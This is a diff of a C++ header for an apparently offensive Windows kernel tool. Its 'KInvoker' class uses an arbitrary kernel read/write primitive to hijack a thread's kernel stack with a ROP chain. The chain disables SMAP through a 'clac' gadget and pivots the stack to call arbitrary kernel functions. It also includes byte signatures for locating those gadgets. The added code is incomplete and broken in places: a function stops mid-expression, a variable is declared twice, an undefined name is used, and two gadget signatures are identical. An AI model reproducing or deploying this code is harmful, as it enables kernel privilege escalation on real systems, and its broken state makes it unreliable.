@@ -1,20 +1,13 @@
 #pragma once
 
 #include "Resolves.h"
+#include "Offsets.h"
 
 #include <queue>
 #include <functional>
+#include <condition_variable>
+#include <atomic>
 
-extern HANDLE g_NotifyCall;
-extern HANDLE g_WaitForCallEnd;
-
-extern "C"
-NTSTATUS NtSignalAndWaitForSingleObject(
-	HANDLE ObjectToSignal,
-	HANDLE ObjectToWaitOn,
-	bool Aleratable,
-	DWORD Timeout
-);
 
 extern "C"
 NTSTATUS NtWaitForSingleObject(
@@ -27,8 +20,46 @@ constexpr ULONG c_TrapFrameSize = 0x190;
 
 class KInvoker 
 {
+public:
+	KInvoker() : m_TerminateWorker(false) {
+		m_WorkerThread = std::thread(&KInvoker::WorkerThread, this);
+	}
 
-	static kAddress GetNtWaitForSingleObjectReturnAddress(kAddress CallingThread, kAddress& )
+	~KInvoker() {
+		{
+			std::lock_guard<std::mutex> lock(m_TaskQueueMutex);
+			m_TerminateWorker = true;
+		}
+		m_QueueUpdateVariable.notify_all();
+		if (m_WorkerThread.joinable()) {
+			m_WorkerThread.join();
+		}
+	}
+
+	template <typename... Args>
+	Qword CallKernelFunction(
+		kAddress Function,
+		Args... Arguments)
+	{
+		auto args = std::make_tuple(std::forward<Args>(Arguments)...);
+		HANDLE event = CreateEventA(nullptr, true, false, nullptr);
+		DWORD currentTid = GetCurrentThreadId();
+		Qword returnValue = 0;
+
+		m_TaskQueue.push([args, event, Function, currentTid, &returnValue]
+			{
+				kAddress thread = Resolves::GetThreadAddress(currentTid);
+				OverrideThreadStackWithFunctionCall(Function, thread, &returnValue, args);
+				SetEvent(event);
+			});
+
+		auto returnValue = Qword(NtWaitForSingleObject(event, false, INFINITE));
+		return returnValue;
+	}
+
+private:
+
+	static kAddress GetNtWaitForSingleObjectReturnAddress(kAddress CallingThread)
 	{
 		//
 		// We target the last return address before returning to UserMode. The call stack after
@@ -41,8 +72,7 @@ class KInvoker
 		// We'll start scanning from the initial stack 
 		//
 
-		constexpr ULONG c_InitialStackOffset = 0x28;
-		kAddress initialStack = g_Rw->ReadQword(CallingThread + c_InitialStackOffset);
+		kAddress initialStack = g_Rw->ReadQword(CallingThread + Offsets::EThread::InitialStack);
 
 		kAddress returnAddress = g_Rw->ReadQword(initialStack - c_TrapFrameSize - sizeof(kAddress));
 		return returnAddress;
@@ -77,35 +107,50 @@ class KInvoker
 		//
 		// Disable SMAP so we could pivot into user stack. Recall the gadget is
 		// 
-		//	.text:00000001403363B4                 clac
-		//	.text:00000001403363B7                 add     rsp, 0C8h
-		//	.text:00000001403363BE                 pop     r14
-		//	.text:00000001403363C0                 pop     rsi
-		//	.text:00000001403363C1                 pop     rbx
-		//	.text:00000001403363C2                 pop     rbp
-		//	.text:00000001403363C3                 retn
+		// KiQuantumEnd:
+		// ...
+		// clac
+		// jmp     loc_14021B880
+		// 
+		// loc_14021B880:
+		// add     rsp, 0B8h
+		// pop     r15
+		// pop     r14
+		// pop     r13
+		// pop     r12
+		// pop     rdi
+		// pop     rsi
+		// pop     rbx
+		// pop     rbp
+		// retn
 		// 
 		// Note: might come later to fuck us :(
 		//
 
 		PUT_STACK(s_Gadgets.DisableSmap);
 		
-		rsp += 0xc8;
+		rsp += 0xb8;
+		PUT_STACK(0x41); // pop r15
 		PUT_STACK(0x41); // pop r14
+		PUT_STACK(0x41); // pop r13
+		PUT_STACK(0x41); // pop r12
+		PUT_STACK(0x41); // pop rdi
 		PUT_STACK(0x41); // pop rsi
 		PUT_STACK(0x41); // pop rbx
-		PUT_STACK(0x41); // pop rbx
-
 		// Our pivot gadget uses rbp as the new stack pointer
 		PUT_STACK(newStack + c_KernelStackSize); // pop rbp
 
 		//
-		// Pivot gadget. Recall that it looks as follows:
-		//
-		// KiPlatformSwapStacksAndCallReturn:
-		//	.text:000000014041F60F                 mov     rsp, rbp
-		//	.text:000000014041F612                 pop     rbp
-		//	.text:000000014041F613                 retn
+		// Stack pivot gadget. Looks as follows:
+		// 
+		// RtlRestoreContext:
+		// ...
+		// .text:00000001404081F6                  mov     rsp, rbp
+		// .text:00000001404081F9                  add     rsp, 30h
+		// .text:00000001404081FD                  pop     rdi
+		// .text:00000001404081FE                  pop     rsi
+		// .text:00000001404081FF                  pop     rbp
+		// .text:0000000140408200                  retn
 		//
 
 		PUT_STACK(s_Gadgets.StackPivot);
@@ -119,6 +164,9 @@ class KInvoker
 #undef PUT_STACK
 #define PUT_STACK(val) *(Qword*)(rsp)++ = Qword(val);
 
+		rsp += 0x30;		// add rsp, 0x30
+		PUT_STACK(0x1337);	// pop rdi
+		PUT_STACK(0x1337);	// pop rsp
 		PUT_STACK(0x1337);	// pop rbp
 
 		//
@@ -171,51 +219,84 @@ class KInvoker
 		std::memcpy(rsp, previousStackData.data(), previousStackData.size());
 	}
 
-	/*
-	Kernel callbacks: we'll put
-	
-	*/
-
-public:
-	template <typename... Args>
-	Qword CallKernelFunction(
-		kAddress Function,
-		Args... Arguments) 
+	void WorkerThread()
 	{
-		auto args = std::make_tuple(std::forward<Args>(Arguments)...);
-		HANDLE event = CreateEventA(nullptr, true, false, nullptr);
-		DWORD currentTid = GetCurrentThreadId();
-		Qword returnValue = 0;
-
-		m_TaskQueue.push([args, event, Function, currentTid, &returnValue]
+		while (true)
+		{
+			std::function<void()> workItem;
 			{
-				kAddress thread = Resolves::GetThreadAddress(currentTid);
-				OverrideThreadStackWithFunctionCall(Function, thread, &returnValue, args);
-				SetEvent(event);
-			});
+				std::unique_lock<std::mutex> lock(m_TaskQueueMutex);
+				m_QueueUpdateVariable.wait(lock, [this] { return !m_TaskQueue.empty() || terminate; });
 
-		auto returnValue = Qword(NtWaitForSingleObject(event, false, INFINITE));
-		return returnValue;
+				if (m_TerminateWorker && m_TaskQueue.empty()) {
+					return;
+				}
+
+				workItem = std::move(m_TaskQueue.front());
+				m_TaskQueue.pop();
+			}
+			workItem();
+		}
 	}
 
-	kAddress GenerateKernelFunctionPointer()
+	static std::optional<kAddress> TryFindSmapGadget()
 	{
+		//
+		// We'll try finding every clac; jmp instruction there is, 
+		// and use match the resulting gadget with our gadget.
+		//
 
+		constexpr Byte ClacJmpRel32[] = { 0x0F, 0x01, 0xCA, 0xE9 };
+		auto signature = Sig::FromBytes(std::span<const Byte>(ClacJmpRel32));
+		
+		const Byte* smapGadget = nullptr;
+		g_KernelBinary->ForEveryCodeSignatureOccurrence(signature,
+			[&](const Byte* occurrence) -> bool {
+				auto* rel32 = occurrence + sizeof(ClacJmpRel32);
+				auto* jmpTarget = occurrence + *(int*)rel32 + 5;
+
+				// simple bounds check
+				//if (jmpTarget > g_KernelBinary->)
+
+				auto found = Sig::FindSignatureInBuffer(
+					std::span<
+				)
+			});
 	}
+
+	static bool InitializeGadgets()
+	{
+		const std::string RetpolineCode = "488b442420488b4c2428488b5424304c8b4424384c8b4c24404883c44848ffe0";
+		auto retpolineSignature = Sig::FromHex(RetpolineCode);
+		auto retpolineAddress =  g_KernelBinary->FindSignature(retpolineSignature, KernelBinary::LocationFlags::InCode);
+		if (!retpolineAddress) return false;
+		s_Gadgets.Retpoline = retpolineAddress.value();
+
+		auto disableSmapSignature = Sig::FromHex(
+			"488b442420488b4c2428488b5424304c8b4424384c8b4c24404883c44848ffe0"
+		);
+		auto disableSmapAddress = g_KernelBinary->FindSignature(disableSmapSignature, KernelBinary::LocationFlags::InCode);
+		if (!disableSmapAddress) return false;
+		s_Gadgets.DisableSmap = disableSmapAddress.value();
+
+		const std::string StackPivotCode = "488be54883c4305f5e5dc3";
+		auto stackPivotSignature = Sig::FromHex(StackPivotCode);
+		auto stackPivotAddress = g_KernelBinary->FindSignature(stackPivotSignature, KernelBinary::LocationFlags::InCode);
+		if (!stackPivotAddress) return false;
+		s_Gadgets.StackPivot = stackPivotAddress.value();
+	}
+
 
 private:
 	std::queue<std::function<void()>> m_TaskQueue;
+	std::thread m_WorkerThread;
+	std::mutex m_TaskQueueMutex;
+	std::condition_variable m_QueueUpdateVariable;
+	std::atomic<bool> m_TerminateWorker;
 
 	static struct {
 		kAddress Retpoline;
 		kAddress StackPivot;
-		kAddress PopRbp;
 		kAddress DisableSmap;
 	} s_Gadgets;
 };
-
-
-
-void WorkerThread(PVOID Context) {
-
-}
